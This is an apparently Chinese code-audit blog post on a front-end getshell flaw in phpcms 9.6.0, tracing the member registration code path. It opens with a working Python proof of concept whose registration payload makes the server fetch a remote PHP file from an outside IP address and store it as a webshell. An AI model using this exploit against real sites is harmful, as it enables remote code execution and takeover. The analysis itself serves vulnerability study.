# 前言
上一节我们分析了phpcms的后台get shell， 但是众所周知， 开发者对后台的漏洞
是不太上心的。因为管理员账号一般只有网站所有者才会有，如果入侵者能获取到管理员
账号，那么基本上意味着网站的所有信息都为他打开了大门，后台漏洞也就不那么重要了。  
那么今天要分析的是phpccms 9.6.0版本的前台get shell. 漏洞的利用方式极其简单。
但是相对而言，代码的漏洞实现逻辑就没有前一篇文章那么简易明了了。

# POC
先看一下POC：  
```
import re
import requests

def poc(url):
    u = '{}/index.php?m=member&c=index&a=register&siteid=1'.format(url)
    data = {
        'siteid': '1',
        'modelid': '1',
        'username': 'test',
        'password': 'testxx',
        'email': 'test@test.com',
        'info[content]': '<img src=http://39.96.176.223/one.txt.php#.jpg>',
        'dosubmit': '1',
    }
    rep = requests.post(u, data=data)
```
非常简单。如果对phpcms有基本的了解的话，可以从url里看出，这其实就是会员的注册
操作。   
好的，那么到phpcms/modules/member/index.php 找到register函数， 一路看下来，
一直到：  
```
if($member_setting['choosemodel']) {
    require_once CACHE_MODEL_PATH.'member_input.class.php';
    require_once CACHE_MODEL_PATH.'member_update.class.php';
    $member_input = new member_input($userinfo['modelid']);		
    $_POST['info'] = array_map('new_html_special_chars',$_POST['info']);
    $user_model_info = $member_input->get($_POST['info']);				        				
}
```
我们看到$_POST['info']在这里被处理过了， 跟进到"new_html_special_chars"函数：  
phpcms/libs/functions/global.func.php 第37行
```
function new_html_special_chars($string) {
	$encoding = 'utf-8';
	if(strtolower(CHARSET)=='gbk') $encoding = 'ISO-8859-15';
	if(!is_array($string)) return htmlspecialchars($string,ENT_QUOTES,$encoding);
	foreach($string as $key => $val) $string[$key] = new_html_special_chars($val);
	return $string;
}
```
可以看出， 函数对$_POST['info']进行了html实体转换处理。  
好，到下一行， 跳转到$member_input->get函数:  
caches/caches_model/caches_data/member_input.class.php 20行  
```
function get($data) {
    $this->data = $data = trim_script($data);
    $model_cache = getcache('member_model', 'commons');
    $this->db->table_name = $this->db_pre.$model_cache[$this->modelid]['tablename'];

    $info = array();
    $debar_filed = array('catid','title','style','thumb','status','islink','description');
    if(is_array($data)) {
        foreach($data as $field=>$value) {
            if($data['islink']==1 && !in_array($field,$debar_filed)) continue;
            $field = safe_replace($field);
            $name = $this->fields[$field]['name'];
            $minlength = $this->fields[$field]['minlength'];
            $maxlength = $this->fields[$field]['maxlength'];
            $pattern = $this->fields[$field]['pattern'];
            $errortips = $this->fields[$field]['errortips'];
            if(empty($errortips)) $errortips = "$name 不符合要求！";
            $length = empty($value) ? 0 : strlen($value);
            if($minlength && $length < $minlength && !$isimport) showmessage("$name 不得少于 $minlength 个字符！");
            if (!array_key_exists($field, $this->fields)) showmessage('模型中不存在'.$field.'字段');
            if($maxlength && $length > $maxlength && !$isimport) {
                showmessage("$name 不得超过 $maxlength 个字符！");
            } else {
                str_cut($value, $maxlength);
            }
            if($pattern && $length && !preg_match($pattern, $value) && !$isimport) showmessage($errortips);
            if($this->fields[$field]['isunique'] && $this->db->get_one(array($field=>$value),$field) && ROUTE_A != 'edit') showmessage("$name 的值不得重复！");
            $func = $this->fields[$field]['formtype'];
            if(method_exists($this, $func)) $value = $this->$func($field, $value);

            $info[$field] = $value;
        }
    }
    return $info;
}
```
可以看到这个函数主要对注册的字段进行了一些限制，如果不符合的话就返回“操作失败”。
一直到这一行：  
```
$func = $this->fields[$field]['formtype'];
if(method_exists($this, $func)) $value = $this->$func($field, $value);
```
说实话这里确实不太好懂，特别是对我这种对php不太熟悉的人来说。不过可以大概看出它是判断此类
有没有这个函数，如果有的话就执行。再看下$this->fields从哪儿来：  
```
 function __construct($modelid) {
    $this->db = pc_base::load_model('sitemodel_field_model');
    $this->db_pre = $this->db->db_tablepre;
    $this->modelid = $modelid;
    $this->fields = getcache('model_field_'.$modelid,'model');
    }
```
在构造函数里面， getcache是从某个数据库model实例化的文件取出值来。那么去找原始的数据库语句，
在install_package/install/main/phpcms_db.sql里面， 找到"model_field_":  
![sql](https://raw.githubusercontent.com/greatyy/codeAudit/master/codeaudit101/imgs/string2array.PNG)